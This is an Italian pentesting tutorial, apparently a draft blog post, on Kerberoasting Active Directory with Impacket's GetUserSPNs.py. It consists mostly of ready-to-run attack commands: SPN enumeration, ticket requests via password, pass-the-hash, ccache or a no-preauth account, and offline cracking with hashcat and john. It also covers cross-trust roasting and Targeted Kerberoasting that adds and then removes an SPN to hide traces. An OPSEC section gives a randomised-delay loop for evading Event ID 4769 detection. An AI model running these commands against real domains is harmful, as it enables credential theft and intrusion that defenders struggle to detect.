---
title: 'GetUserSPNs.py: Kerberoasting e TGS con Impacket '
slug: getuserspns
description: 'Guida a impacket-GetUserSPNs per enumerare account con SPN e richiedere TGS Kerberos con password, hash NTLM, ccache o chiavi AES per Windows Active Directory'
image: /getuserspns-py-kerberoasting-impacket.webp
draft: true
date: 2026-07-30T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - impacket
  - getuserspns
  - kerberoasting
  - kerberos
  - active-directory
---

# GetUserSPNs.py — Kerberoasting con Impacket: Guida Completa

`GetUserSPNs.py` fa due cose in sequenza: cerca via LDAP gli account utente con SPN registrati, poi richiede un Service Ticket per ognuno. Quel ticket è cifrato con l'hash della password dell'account — craccabile offline senza interagire mai col target direttamente.

`GetUserSPNs.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è lo strumento standard per il Kerberoasting da Linux. La teoria del perché l'attacco funziona — il TGS cifrato con l'hash dell'account di servizio — è spiegata in dettaglio nell'articolo [TGS e Kerberoasting](https://hackita.it/articoli/tgs/). Qui ci concentriamo sul tool: tutti i flag, gli scenari avanzati, e le scelte OPSEC che fanno la differenza tra un Kerberoasting che fila liscio e uno che finisce in un alert.

***

## Come funziona internamente

Il tool fa due operazioni distinte che è importante tenere separate nella testa:

```
STEP 1 — Enumerazione SPN (LDAP, porta 389)
  └── Query: (&(objectClass=user)(servicePrincipalName=*))
  └── Filtra computer account (objectCategory=person)
  └── Risultato: lista di account con SPN + metadati

STEP 2 — Richiesta TGS (Kerberos, porta 88) — solo con -request
  └── Per ogni account trovato: TGS-REQ al KDC
  └── KDC risponde con ticket cifrato con hash dell'account
  └── Hash estratto e formattato per hashcat/john
```

Puoi fare solo lo Step 1 (senza `-request`) per ricognizione, o entrambi in un colpo solo.

***

## Sintassi e tutti i flag

```bash
impacket-GetUserSPNs [opzioni] dominio/utente[:password]
```

| Flag                     | Cosa fa                                                                                                                         |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
| `-request`               | Richiede il TGS per ogni SPN trovato — senza questo, enumera solo                                                               |
| `-request-user USERNAME` | Richiede il TGS solo per un account specifico — più stealth                                                                     |
| `-outputfile FILE`       | Salva gli hash su file invece di stamparli a schermo                                                                            |
| `-stealth`               | Rimuove il filtro `(servicePrincipalName=*)` dalla query LDAP — meno rumore su LDAP monitoring, ma più pesante su domini grandi |
| `-no-preauth ACCOUNT`    | Usa un account senza pre-auth per richiedere TGS senza credenziali                                                              |
| `-usersfile FILE`        | Lista di target SPN/account da roastare (con `-no-preauth`)                                                                     |
| `-target-domain DOMAIN`  | Kerberoasting cross-trust verso un dominio diverso                                                                              |
| `-machine-only`          | Solo computer account (non user account)                                                                                        |
| `-hashes LM:NT`          | Pass-the-Hash per autenticarsi                                                                                                  |
| `-k`                     | Kerberos con ccache                                                                                                             |
| `-aesKey KEY`            | Chiave AES per autenticazione                                                                                                   |
| `-dc-ip IP`              | IP del Domain Controller                                                                                                        |
| `-dc-host HOST`          | Hostname del DC (alternativo a dc-ip)                                                                                           |
| `-save`                  | Salva ogni TGS come file `.ccache` separato                                                                                     |
| `-debug`                 | Output verbose                                                                                                                  |

***

## Uso base — enumera prima, poi decidi

La prima cosa da fare è sempre **enumerare senza richiedere ticket**. Guardi cosa c'è, valuti le priorità, poi attacchi solo i target che vale la pena craccare.

```bash
# Enumera SPN senza richiedere ticket — solo ricognizione
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5

# Output:
# ServicePrincipalName                  Name        MemberOf   PasswordLastSet             LastLogon
# ------------------------------------  ----------  ---------  --------------------------  ---------
# MSSQLSvc/sql01.corp.local:1433        svc_sql                2019-03-10 08:00:00         <never>
# HTTP/web01.corp.local                 svc_web                2024-01-15 09:30:00         2024-03-01
# MSSQLSvc/sql02.corp.local:SQLEXPRESS  svc_sql2               2021-06-01 12:00:00         2023-11-10
```

**Cosa valutare nell'output:**

* **PasswordLastSet vecchia** (anni) → password probabilmente debole → alta priorità per il crack
* **LastLogon `<never>`** → account abbandonato → policy password più rilassata storicamente
* **MemberOf** → se è in gruppi privilegiati, vale ancora di più craccarlo
* **Nome servizio** → `MSSQLSvc`, `HTTP`, `WSMAN` → service account tipici, spesso con password deboli

***

## Richiedi i ticket — tutti o uno solo

```bash
# Tutti i TGS in un colpo
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request -outputfile /tmp/kerberoast.txt

# Solo un account specifico — meno richieste, meno rumore
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request-user svc_sql

# Con PtH
impacket-GetUserSPNs -hashes :NThash corp.local/user -dc-ip 10.10.10.5 \
  -request -outputfile /tmp/kerberoast.txt

# Con TGT (Kerberos)
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs -k -no-pass corp.local/user -dc-ip 10.10.10.5 \
  -request -outputfile /tmp/kerberoast.txt
```

Gli hash nel file hanno questo formato:

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3...
```

Il numero dopo `$krb5tgs$` è il tipo di cifratura: `23` = RC4, `17` = AES-128, `18` = AES-256.

***

## Crack offline

```bash
# RC4 (etype 23) — il più comune, il più veloce da craccare
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /tmp/kerberoast.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-128 (etype 17)
hashcat -m 19600 /tmp/kerberoast.txt rockyou.txt

# AES-256 (etype 18)
hashcat -m 19700 /tmp/kerberoast.txt rockyou.txt

# John the Ripper
john --format=krb5tgs /tmp/kerberoast.txt --wordlist=rockyou.txt
```

***

## Flag avanzati

### `-stealth` — nasconde la query LDAP

Di default la query LDAP usa il filtro `(servicePrincipalName=*)`, che è un pattern riconoscibile per tool di monitoring LDAP. Con `-stealth` il filtro viene rimosso — la query scarica **tutti** gli oggetti utente e poi filtra lato client. Meno rumore sulla rete, ma può essere pesante su domini con migliaia di oggetti.

```bash
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request -stealth -outputfile /tmp/kerberoast.txt
```

### `-request-user` — target singolo

Invece di richiedere TGS per tutti gli SPN trovati, attacchi solo un account specifico. Un'unica richiesta TGS genera molto meno rumore di 15 in sequenza in pochi secondi — l'IoC principale del Kerberoasting è proprio il burst di Event ID 4769.

```bash
# Solo svc_sql — una singola richiesta TGS
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request-user svc_sql
```

### `-target-domain` — cross-trust Kerberoasting

Se il dominio in cui sei autenticato ha una forest trust o domain trust verso un altro dominio, puoi fare Kerberoasting sugli account del dominio trustato usando le tue credenziali. Il DC locale fa da proxy verso il DC del dominio target.

```bash
# Sei autenticato su corp.local, vuoi roastare subsidiary.corp.local
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -target-domain subsidiary.corp.local -request -outputfile /tmp/cross_trust.txt
```

### `-no-preauth` — Kerberoasting senza credenziali

Se conosci un account senza pre-autenticazione (AS-REP Roastable) e una lista di SPN target, puoi richiedere TGS senza avere credenziali valide — il KDC usa l'AS-REP dell'account no-preauth come autenticazione iniziale.

```bash
# bobby non richiede pre-auth → usalo per ottenere TGS sugli SPN in services.txt
impacket-GetUserSPNs corp.local/ \
  -no-preauth bobby \
  -usersfile services.txt \
  -dc-host DC01.corp.local

# services.txt contiene SPN o sAMAccountName target:
# svc_sql
# svc_web
# MSSQLSvc/sql01.corp.local:1433
```

***

## Targeted Kerberoasting — forza un SPN su un account

Se hai `GenericWrite` o `GenericAll` su un account che non ha SPN, puoi aggiungerne uno tu — rendendolo Kerberoastable — roastarlo, craccarlo, poi rimuovere l'SPN per non lasciare tracce. Questa è la tecnica nota come **Targeted Kerberoasting**, approfondita nell'articolo [ACL Abuse](https://hackita.it/articoli/acl-abuse/).

```bash
# Con PowerView — aggiungi SPN all'account target
Set-DomainObject -Identity john.doe -SET @{serviceprincipalname='fake/FAKE'}

# Kerberoasta l'account
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request-user john.doe

# Cracca l'hash
hashcat -m 13100 hash.txt rockyou.txt

# Rimuovi l'SPN (cleanup)
Set-DomainObject -Identity john.doe -Clear serviceprincipalname
```

***

## OPSEC

Il Kerberoasting è rilevabile principalmente tramite **Event ID 4769** (TGS-REQ) con questi indicatori:

| Indicatore         | Valore sospetto                               |
| ------------------ | --------------------------------------------- |
| Ticket Options     | `0x40810010` — valore fisso di GetUserSPNs.py |
| Encryption Type    | `0x17` (RC4) — anomalia su ambienti AES-only  |
| Burst di richieste | 10+ TGS in pochi secondi dallo stesso IP      |
| Service Name       | Non krbtgt, non termina con `$`               |

Come ridurre il rumore:

```bash
# 1. Usa -request-user per un account alla volta invece del bulk
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request-user svc_sql

# 2. Aspetta tra una richiesta e l'altra (manuale o con script)
for user in svc_sql svc_web svc_backup; do
  impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request-user $user \
    >> /tmp/hashes.txt
  sleep $((RANDOM % 30 + 10))
done

# 3. Preferisci account con PasswordLastSet vecchia — più probabilità di craccare
#    Evita account con password recente — meno probabilità di successo, stesso rumore

# 4. Se RC4 è disabilitato nel dominio, non forzarlo — usa AES per non generare anomalie
```

***

## Cheat Sheet

```bash
# Enumera SPN (no ticket)
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP

# Richiedi tutti i TGS
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP \
  -request -outputfile hashes.txt

# Target singolo (stealth)
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP \
  -request-user svc_sql

# Con PtH
impacket-GetUserSPNs -hashes :NThash corp.local/user -dc-ip DC_IP -request

# Stealth (no SPN filter in LDAP)
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -stealth

# Cross-trust
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP \
  -target-domain other.domain -request

# Senza credenziali (account no-preauth noto)
impacket-GetUserSPNs corp.local/ -no-preauth bobby \
  -usersfile spns.txt -dc-host DC01.corp.local

# Crack
hashcat -m 13100 hashes.txt rockyou.txt          # RC4
hashcat -m 19600 hashes.txt rockyou.txt          # AES-128
hashcat -m 19700 hashes.txt rockyou.txt          # AES-256
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [TGS — Service Ticket e Kerberoasting in profondità](https://hackita.it/articoli/tgs/)
* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
* [ACL Abuse — Targeted Kerberoasting](https://hackita.it/articoli/acl-abuse/)
* [BloodHound — trova account Kerberoastable](https://hackita.it/articoli/bloodhound/)
* [Rubeus — Kerberoasting da Windows](https://hackita.it/articoli/rubeus/)
* [Hashcat: crack degli hash](https://hackita.it/articoli/hashcat/)
* [getTGT.py — richiedi TGT con hash/AES](https://hackita.it/articoli/gettgt/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #kerberos #kerberoasting #active-directory
